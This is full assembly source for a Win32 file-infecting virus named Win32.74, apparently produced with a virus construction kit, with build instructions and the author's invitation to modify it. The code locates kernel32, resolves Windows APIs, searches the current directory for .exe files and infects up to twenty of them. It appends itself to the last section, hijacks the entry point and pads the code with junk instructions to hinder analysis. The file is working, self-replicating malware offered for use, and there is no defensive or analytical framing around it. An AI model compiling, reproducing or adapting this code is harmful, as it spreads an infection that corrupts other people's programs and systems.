              
;
;
; Win32.74 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.74
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 74
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 42
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, eax
 add edx, [eax+3Ch]
                                        ; get File Alignment
                                        ; add edx, 60
 add edx, 60d
 mov ebx, [edx]
                                        ; mov ecx, 60
 mov ecx, ( 60d xor 12d )
 xor ecx, 12d
 sub edx, ecx
                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
                                        ; clear eax
 mov eax, -20440d
 add eax, 20440d
 mov ax, word ptr [esi+06h]
 dec eax
 imul eax, eax, 28h
                                        ; add ebx, 120
 inc ebx
 add ebx, 119d
 add ebx, eax
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [esi+74h]
 clc
 rcl eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [esi+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
 mov ecx, [ebx+10h]
                                        ; mov eax, ecx
                                        ; clear eax
 xor eax, eax
 add eax, ecx
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push eax
 pop edx
 add ebx, 0Ch
 add edx, [ebx]
 sub ebx, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], edx
                                        ; clear edx
 push 0
 pop edx

 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+0Ch]
 add edx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '74'
                                        ; Append Virus
 pop edi
 lea ebx, [ebp+Virus]
 xchg esi, ebx

 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch3 dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h
 NewEIP      dd 0h
 FindHandle  dd 0h

 APINames:
 db 'FindFirstFileA', 0
 db 'FindClose', 0
 db 'CloseHandle', 0
 db 'CreateFileA', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileMappingA', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0

 ATableVA    dd 0h
 OTableVA    dd 0h
 AlignReg1   dd 0h
 NTableTemp  dd 0h
 Trash1      dd 0h
 KernelPE    dd 0h
 FileHandle  dd 0h
 AlignTemp   dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h

 AlignReg2   dd 0h
 MapAddress  dd 0h
 InfCounter  dd 0h
 db 'Win32.74 by SnakeByte',0
 counter     dw 0h
 NewSize     dd 0h
 MapHandle   dd 0h
 filemask    db '*.exe',0
 OldBase     dd 400000h
 TempApisearch2 dd 0h
 OldEIP      dd 0h
 KernelMZ    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, 0
 add ecx, 2d
 or ebx, 84280589d                      ; Trash
 push ecx
 push dword ptr [ebp+MapHandle]
 xor dword ptr [ebp+Trash1], 42798      ; Trash
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
 inc dword ptr [ebp+Trash1]             ; Trash
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; clear eax
 mov eax, 0
 cmp eax, 0
 je Notagoodfile

Goodfile:
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [edi+3Ch]
 test eax, eax
 jz Notagoodfile
                                        ; clear eax
 mov eax, 15949d
 sub eax, 15949d
 add eax, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, edi
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [eax]
 xor edx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], '74'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edi

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 mov ebx, 20d
 mov dword ptr [ebp+InfCounter], ebx
 mov eax, ebp
 add eax, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 sub eax, 1
 add eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 and edi, 0
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 sub eax, eax
 add eax, [edi+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 dec eax
 add eax, 29d
                                        ; get ATableVA
 mov edi, dword ptr [eax]
 ror ecx, 12d                           ; Trash
 add edi, [ebp+KernelMZ]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [eax]
                                        ; add eax, 4
 add eax, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [eax]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 pop dword ptr [ebp+NTableTemp]
 mov ecx, dword ptr [eax]
 add ecx, [ebp+KernelMZ]
                                        ; mov eax, ecx
 mov eax, ecx
                                        ; mov esi, ecx
 push ecx
 pop esi
 push ebx
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], esi
 push edx
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [edx]
 and dword ptr [ebp+Trash1], edx        ; Trash
 cmp ch, byte ptr [esi]
 jne ApiNotFound
 sub ebx, 1
                                        ; add ebx, 1
 sub ebx, -1d
 sub ebx, 1
 jz FoundApi1
                                        ; add edx, 1
 add edx, 1d
                                        ; add esi, 1
 inc esi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
                                        ; clear edx
 and edx, 0
 xor edx, dword ptr [ebp+TempApisearch3]
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+NTableTemp]
                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, ecx
                                        ; clear eax
 mov eax, 0
 mov ax, word ptr [ecx]
 clc
 rcl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [eax]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 mov ecx, 31228d
 sub ecx, 31228d
 add ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg edx, ebx

 mov esi, offset APIOffsets
 add esi, ebp


GetApisLoop: 

 mov ebx, edx
APINameDetect:                          ; calculate the lenght of the names
 add ebx, 1d
 cmp byte ptr [ebx], 0
 jne APINameDetect
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 push ebx
 sub dword ptr [esp], edx
 pop ebx
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add edx, 1
 add edx, 1d
 add edx, ebx
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 dec ecx
 jnz GetApisLoop
 mov eax, offset Outbreak
 add eax, ebp

 push eax
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], esi

 mov ecx, dword ptr [ebp+OldEIP]

 push ecx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -55164d
 add edx, 55164d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 sub di, di
                                        ; add edi, 1
 sub edi, -1d
GetKernelLoop:
                                        ; clear eax
 sub eax, eax
 dec edi
 mov ax, word ptr [edi+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp edi, dword ptr [edi+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], edi
 mov eax, edi
 add eax, [edi+3Ch]
 mov [KernelPE+ebp], eax

 jmp GetApis

;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, esi

 push esi
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, 0
 add ecx, 276d
 lea edx, [ebp+WFD_szFileName]
 xchg eax, edx


ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 add eax, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, 22782d
 sub ecx, 22782d
 push ecx
 call ExitProcess



end FakeCode

